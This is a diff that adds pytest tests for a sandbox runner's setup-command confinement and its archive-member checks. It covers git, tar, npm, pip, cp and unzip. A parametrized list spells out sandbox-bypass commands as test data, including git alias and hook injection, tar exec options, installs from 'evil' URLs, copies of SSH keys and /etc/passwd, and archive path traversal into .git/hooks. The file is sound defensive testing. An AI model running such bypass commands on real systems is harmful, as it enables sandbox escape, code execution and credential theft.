@@ -3,9 +3,14 @@
 from __future__ import annotations
 
 import json
+import os
+import shutil
 import stat
 import subprocess
 import sys
+import tarfile
+import tempfile
+import zipfile
 from dataclasses import dataclass
 from pathlib import Path
 from types import SimpleNamespace
@@ -16,6 +21,7 @@ from scripts.runner import (
     SANDBOX_BASE,
     _parse_stream_json,
     _safe_sandbox_dir,
+    _sandboxed_setup_command,
     _setup_sandbox,
     run_scenario,
 )
@@ -320,6 +326,298 @@ class TestSetupSandboxSkipsShellBuiltins:
         assert ["touch", "file.txt"] in called_args
         assert ["echo", "hi"] in called_args
         assert ["cd", "ignored"] not in called_args
+
+
+_GIT = ["git", "-c", f"core.hooksPath={os.devnull}"]
+
+
+def _run_setup(sandbox: Path, *commands: str) -> list[list[str]]:
+    """Run _setup_sandbox with a fake subprocess and return the argv it executed."""
+    called: list[list[str]] = []
+
+    def fake_run(args, **kwargs):
+        called.append(list(args))
+        return subprocess.CompletedProcess(args=args, returncode=0)
+
+    with patch("scripts.runner.subprocess.run", side_effect=fake_run):
+        _setup_sandbox(sandbox, _FakeScenario(id="confine", setup_commands=commands))
+    assert called[0] == ["git", "init"]
+    return called[1:]
+
+
+class TestSetupCommandConfinement:
+    """Allowed tools keep their file-creating uses but lose their code-running ones."""
+
+    @pytest.mark.parametrize("command", [
+        # git: inline config, aliases, global options, hook/config writes
+        "git -c 'alias.x=!touch /tmp/pwned' x",
+        "git -c core.fsmonitor=evil status",
+        "git --config-env=core.pager=EVIL log",
+        "git -C .. init",
+        "git config alias.x '!sh -c id'",
+        "git config core.hooksPath hooks",
+        "git config core.sshCommand evil",
+        "git config --global user.name x",
+        "git clone --upload-pack='touch /tmp/pwned' repo",
+        "git fetch --upload-pack=evil origin",
+        # tar: program-running options, abbreviated or bundled
+        "tar -cf /dev/null x --to-command='sh -c id'",
+        "tar --checkpoint=1 --checkpoint-action=exec='sh -c id' -cf a.tar .",
+        "tar --use-compress-program='sh -c id' -cf a.tar src",
+        "tar -I 'sh -c id' -cf a.tar src",
+        "tar cIf evil a.tar src",
+        "tar --to-com=sh -xf a.tar",
+        "tar -xf host:archive.tar",
+        # npm: arbitrary package sources, scripts, exec, global installs
+        "npm install git+https://example.com/evil.git",
+        "npm install https://example.com/evil.tgz",
+        "npm install ./evil",
+        "npm install user/repo",
+        "npm install -g evil",
+        "npm install --foreground-scripts evil",
+        "npm exec evil-pkg",
+        "npm run build",
+        "npm init evil",
+        # pip: source builds, editable/local/VCS installs, other indexes
+        "pip install -e .",
+        "pip install git+https://example.com/evil.git",
+        "pip install ./evil",
+        "pip install -r requirements.txt",
+        "pip install --index-url https://evil.example/simple x",
+        "pip3 install --user evil",
+        "pip download evil",
+        # cp/mv/chmod/touch/mkdir/unzip: paths outside the sandbox or into .git
+        "cp ~/.ssh/id_ed25519 .",
+        "cp /etc/passwd .",
+        "cp ../../secret .",
+        "cp -t.. file",
+        "cp --target-directory=/tmp file",
+        "mv src /tmp/elsewhere",
+        "mv src ..",
+        "cp file .git/hooks/pre-commit",
+        "chmod +x .git/hooks/pre-commit",
+        "touch -r /etc/shadow x",
+        "mkdir -p /tmp/skill-comply-sandbox/x",
+        "unzip a.zip -d /tmp/out",
+        # git options that install hooks or move the repository
+        "git init --template=templates",
+        "git init --separate-git-dir=gitdir",
+        "git commit --template=msg -m x",
+        "git add --chmod=+x hook",
+        # option values attached to the flag
+        "cp -r --target-directory=.git hooks",
+        "cp -r -t.git hooks",
+        "cp -rt.GIT hooks",
+        "tar -xf hooks.tar --directory=.git",
+        "unzip 'payload*'",
+        "unzip -P pw payload.zip",
+        "unzip -P good.zip payload.zip",
+        "unzip -d",
+        "unzip -q",
+    ])
+    def test_bypass_is_not_executed(self, tmp_path: Path, command: str) -> None:
+        assert _run_setup(tmp_path / "sandbox", command) == []
+
+    @pytest.mark.parametrize("command,expected", [
+        ("mkdir -p src tests", ["mkdir", "-p", "src", "tests"]),
+        ("touch src/__init__.py", ["touch", "src/__init__.py"]),
+        ("echo hello", ["echo", "hello"]),
+        ("git add .", [*_GIT, "add", "."]),
+        ("git commit -m 'initial commit'", [*_GIT, "commit", "-m", "initial commit"]),
+        ("git config user.email test@example.com", [*_GIT, "config", "user.email", "test@example.com"]),
+        ("git checkout -b feature/x", [*_GIT, "checkout", "-b", "feature/x"]),
+        ("cp src/a.py src/b.py", ["cp", "src/a.py", "src/b.py"]),
+        ("mv src/a.py lib.py", ["mv", "src/a.py", "lib.py"]),
+        ("chmod +x run.sh", ["chmod", "+x", "run.sh"]),
+        ("tar -czf src.tar.gz src", ["tar", "-czf", "src.tar.gz", "src"]),
+        ("tar xzf src.tar.gz", ["tar", "xzf", "src.tar.gz"]),
+        ("npm init -y", ["npm", "init", "-y"]),
+        (
+            "npm install --save-dev jest@29 @types/node",
+            ["npm", "install", "--save-dev", "jest@29", "@types/node", "--ignore-scripts"],
+        ),
+    ])
+    def test_normal_setup_still_runs(self, tmp_path: Path, command: str, expected: list[str]) -> None:
+        assert _run_setup(tmp_path / "sandbox", command) == [expected]
+
+    def test_pip_install_is_wheel_only_and_stays_in_sandbox(self, tmp_path: Path) -> None:
+        sandbox = tmp_path / "sandbox"
+        assert _run_setup(sandbox, "pip install pytest 'requests>=2'") == [[
+            "pip", "install", "pytest", "requests>=2",
+            "--only-binary=:all:", "--target", str(sandbox / ".pip-packages"),
+        ]]
+
+    def test_absolute_path_inside_sandbox_is_allowed(self, tmp_path: Path) -> None:
+        sandbox = tmp_path / "sandbox"
+        assert _run_setup(sandbox, f"mkdir -p {sandbox}/src") == [["mkdir", "-p", f"{sandbox}/src"]]
+
+
+class TestArchiveMembers:
+    """tar -x / unzip only run when every member is a plain file outside .git."""
+
+    @pytest.mark.parametrize("name,ok", [
+        ("src/a.py", True),
+        (".gitignore", True),
+        (".git/hooks/pre-commit", False),
+        ("sub/.GIT/config", False),
+        ("../escape", False),
+        ("/abs", False),
+        ("a\\..\\..\\x", False),
+    ])
+    def test_member_names(self, tmp_path: Path, name: str, ok: bool) -> None:
+        sandbox = tmp_path / "sandbox"
+        sandbox.mkdir()
+        with tarfile.open(sandbox / "a.tar", "w") as archive:
+            archive.addfile(tarfile.TarInfo(name))
+        with zipfile.ZipFile(sandbox / "a.zip", "w") as archive:
+            archive.writestr(name, "")
+        for command in ("tar -xf a.tar", "unzip a.zip"):
+            assert (_sandboxed_setup_command(command.split(), sandbox) is not None) is ok, command
+
+    def test_archive_after_other_option_arguments_is_checked(self, tmp_path: Path) -> None:
+        sandbox = tmp_path / "sandbox"
+        sandbox.mkdir()
+        with tarfile.open(sandbox / "bad.tar", "w") as archive:
+            archive.addfile(tarfile.TarInfo(".git/hooks/pre-commit"))
+        with tarfile.open(sandbox / "good.tar", "w") as archive:
+            archive.addfile(tarfile.TarInfo("src/a.py"))
+        # old-style clusters take their option arguments in letter order: C gets ".", f the archive
+        for name, ok in (("bad.tar", False), ("good.tar", True)):
+            for command in (f"tar xCf . {name}", f"tar -xC . -f {name}"):
+                assert (_sandboxed_setup_command(command.split(), sandbox) is not None) is ok, command
+
+    def test_links_and_unknown_formats_are_refused(self, tmp_path: Path) -> None:
+        sandbox = tmp_path / "sandbox"
+        sandbox.mkdir()
+        link = tarfile.TarInfo("inside")
+        link.type, link.linkname = tarfile.SYMTYPE, "elsewhere"
+        with tarfile.open(sandbox / "link.tar", "w") as archive:
+            archive.addfile(link)
+        (sandbox / "a.tar.zst").write_bytes(b"\x28\xb5\x2f\xfd")
+        assert _sandboxed_setup_command(["tar", "-xf", "link.tar"], sandbox) is None
+        assert _sandboxed_setup_command(["tar", "-xf", "a.tar.zst"], sandbox) is None
+        assert _sandboxed_setup_command(["tar", "-cf", "out.tar", "a.tar.zst"], sandbox) is not None
+
+    def test_selected_members_are_not_checked_as_archives(self, tmp_path: Path) -> None:
+        sandbox = tmp_path / "sandbox"
+        sandbox.mkdir()
+        (sandbox / "README.md").write_text("stale")
+        src = tmp_path / "fresh"
+        src.mkdir()
+        (src / "README.md").write_text("restored")
+        with tarfile.open(sandbox / "fixtures.tar", "w") as archive:
+            archive.add(src / "README.md", arcname="README.md")
+        for command in ("tar -xf fixtures.tar README.md", "tar xf fixtures.tar README.md", "tar --file=fixtures.tar -x README.md"):
+            argv = _sandboxed_setup_command(command.split(), sandbox)
+            assert argv is not None, command
+            (sandbox / "README.md").write_text("stale")
+            subprocess.run(argv, cwd=sandbox, check=True)
+            assert (sandbox / "README.md").read_text() == "restored", command
+        # members under .git or outside the sandbox stay refused
+        assert _sandboxed_setup_command(["tar", "-xf", "fixtures.tar", ".git/hooks/pre-commit"], sandbox) is None
+        assert _sandboxed_setup_command(["tar", "-xf", "fixtures.tar", "../x"], sandbox) is None
+        # the archive operand is still checked even when members are selected
+        (sandbox / "bad.tar").write_bytes(b"not an archive")
+        assert _sandboxed_setup_command(["tar", "-xf", "bad.tar", "README.md"], sandbox) is None
+        with zipfile.ZipFile(sandbox / "f.zip", "w") as archive:
+            archive.writestr("README.md", "restored")
+        assert _sandboxed_setup_command(["unzip", "-o", "f.zip", "README.md"], sandbox) is not None
+
+
+class TestUnzipArchiveBinding:
+    """The extractor must open the exact existing ZIP whose members were checked."""
+
+    @staticmethod
+    def archive(path: Path, name: str = "data/value.txt") -> None:
+        with zipfile.ZipFile(path, "w") as archive:
+            archive.writestr(name, "checked fixture")
+
+    @pytest.mark.parametrize("flags", [[], ["-o"], ["-n"], ["-q"], ["-qq"], ["-j"], ["-oq"]])
+    def test_safe_archive_is_bound_to_its_checked_path(self, tmp_path: Path, flags: list[str]) -> None:
+        archive = tmp_path / "safe.zip"
+        self.archive(archive)
+        argv = _sandboxed_setup_command(["unzip", *flags, "safe.zip", "-d", "output"], tmp_path)
+        assert argv == ["unzip", *flags, str(archive.resolve()), "-d", "output"]
+        if not shutil.which("unzip"):
+            pytest.skip("unzip is unavailable")
+        subprocess.run(argv, cwd=tmp_path, check=True, capture_output=True)
+        target = "value.txt" if "-j" in flags else "data/value.txt"
+        assert (tmp_path / "output" / target).read_text() == "checked fixture"
+
+    def test_destination_before_archive_and_selected_member_are_preserved(self, tmp_path: Path) -> None:
+        archive = tmp_path / "safe.zip"
+        self.archive(archive)
+        argv = _sandboxed_setup_command(["unzip", "-d", "output", "-o", "safe.zip", "data/value.txt"], tmp_path)
+        assert argv == ["unzip", "-d", "output", "-o", str(archive.resolve()), "data/value.txt"]
+        if not shutil.which("unzip"):
+            pytest.skip("unzip is unavailable")
+        subprocess.run(argv, cwd=tmp_path, check=True, capture_output=True)
+        assert (tmp_path / "output/data/value.txt").read_text() == "checked fixture"
+
+    @pytest.mark.parametrize("member", ["data/value.txt", ".git/hooks/post-commit"])
+    def test_missing_archive_never_uses_implicit_zip_suffix(self, tmp_path: Path, member: str) -> None:
+        self.archive(tmp_path / "payload.zip", member)
+        assert _sandboxed_setup_command(["unzip", "-o", "payload"], tmp_path) is None
+
+    def test_existing_extensionless_zip_is_allowed_without_suffix_lookup(self, tmp_path: Path) -> None:
+        archive = tmp_path / "payload"
+        self.archive(archive)
+        self.archive(tmp_path / "payload.zip", ".git/hooks/post-commit")
+        argv = _sandboxed_setup_command(["unzip", "-o", "payload"], tmp_path)
+        assert argv == ["unzip", "-o", str(archive.resolve())]
+        if not shutil.which("unzip"):
+            pytest.skip("unzip is unavailable")
+        subprocess.run(argv, cwd=tmp_path, check=True, capture_output=True)
+        assert (tmp_path / "data/value.txt").read_text() == "checked fixture"
+        assert not (tmp_path / ".git/hooks/post-commit").exists()
+
+    @pytest.mark.parametrize("password", ["pw", "good.zip"])
+    def test_password_options_cannot_hide_the_real_archive(self, tmp_path: Path, password: str) -> None:
+        self.archive(tmp_path / "good.zip")
+        self.archive(tmp_path / "payload.zip", ".git/hooks/post-commit")
+        assert _sandboxed_setup_command(["unzip", "-P", password, "payload.zip"], tmp_path) is None
+
+    @pytest.mark.parametrize("args", [
+        [], ["-q"], ["-d"], ["safe.zip", "-d"], ["-d", "-q", "safe.zip"],
+        ["-Ppw", "safe.zip"], ["-Z", "safe.zip"], ["-T", "safe.zip"],
+        ["-doutput", "safe.zip"], ["--unrecognized", "safe.zip"], ["safe*"],
+    ])
+    def test_missing_or_ambiguous_arguments_are_not_executed(self, tmp_path: Path, args: list[str]) -> None:
+        self.archive(tmp_path / "safe.zip")
+        assert _sandboxed_setup_command(["unzip", *args], tmp_path) is None
+
+
+class TestSandboxBaseOwnership:
+    def test_default_base_is_per_user(self) -> None:
+        if hasattr(os, "getuid"):
+            assert SANDBOX_BASE.name == f"skill-comply-sandbox-{os.getuid()}"
+        assert SANDBOX_BASE.parent == Path(tempfile.gettempdir())
+
+    @pytest.mark.skipif(sys.platform == "win32", reason="POSIX modes only")
+    @pytest.mark.parametrize("existing", [False, True])
+    def test_setup_leaves_base_private(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, existing: bool
+    ) -> None:
+        base = tmp_path / "base"
+        if existing:
+            base.mkdir()
+            base.chmod(0o777)
+        monkeypatch.setattr("scripts.runner.SANDBOX_BASE", base)
+        _run_setup(base / "probe")
+        assert stat.S_IMODE(base.stat().st_mode) == 0o700
+
+    @pytest.mark.skipif(not hasattr(os, "getuid"), reason="POSIX ownership only")
+    def test_foreign_owned_base_is_rejected(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+        base = tmp_path / "base"
+        base.mkdir()
+        monkeypatch.setattr("scripts.runner.SANDBOX_BASE", base)
+        real_uid = os.getuid()
+        monkeypatch.setattr("scripts.runner.os.getuid", lambda: real_uid + 1)
+        with patch("scripts.runner.subprocess.run") as execute:
+            with pytest.raises(ValueError, match="owned"):
+                _setup_sandbox(base / "probe", _FakeScenario(id="probe"))
+            execute.assert_not_called()
+        assert not (base / "probe").exists()
 
 
 class TestRunScenarioMaxTurnsTermination:
